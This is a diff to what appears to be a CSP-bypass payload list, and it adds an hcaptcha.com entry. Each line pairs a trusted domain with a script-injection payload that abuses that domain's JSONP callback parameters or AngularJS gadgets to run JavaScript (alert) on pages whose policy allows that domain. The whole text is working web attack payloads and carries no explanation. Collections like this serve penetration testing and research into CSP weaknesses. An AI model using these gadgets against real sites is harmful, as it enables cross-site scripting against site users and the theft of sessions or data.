@@ -77,6 +77,7 @@ graph.facebook.com	<script src="https://graph.facebook.com/?id=1337&callback=ale
 gstatic.com	<body ng-app ng-csp><script src="//gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 gstatic.com	<script src='https://gstatic.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
 gum.criteo.com	<script src="https://gum.criteo.com/sync?c=123&r=2&a=1&j=alert"></script>
+hcaptcha.com	<script src="https://hcaptcha.com/1/api.js?onload=alert&render=explicit"></script>
 help.afterpay.com	<script src="https://help.afterpay.com/sc/faye/?message=[{%22channel%22:%22%22}]&jsonp=alert"></script>
 ib.adnxs.com	<script src="https://ib.adnxs.com/async_usersync?cbfn=alert(1)-"></script>
 info.cloudflare.com	<script src="https://info.cloudflare.com//index.php/form/getForm?munchkinId=194-VVC-221&form=1077&callback=alert"></script>
